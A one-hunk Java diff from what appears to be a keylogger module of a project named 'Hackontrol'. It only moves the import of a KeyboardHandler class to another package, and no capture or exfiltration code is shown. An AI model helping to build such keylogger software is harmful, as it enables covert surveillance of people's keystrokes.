@@ -2,7 +2,7 @@ package com.khopan.hackontrol.module.keylogger;
 
 import java.util.List;
 
-import com.khopan.hackontrol.handler.KeyboardHandler;
+import com.khopan.hackontrol.KeyboardHandler;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.Question;
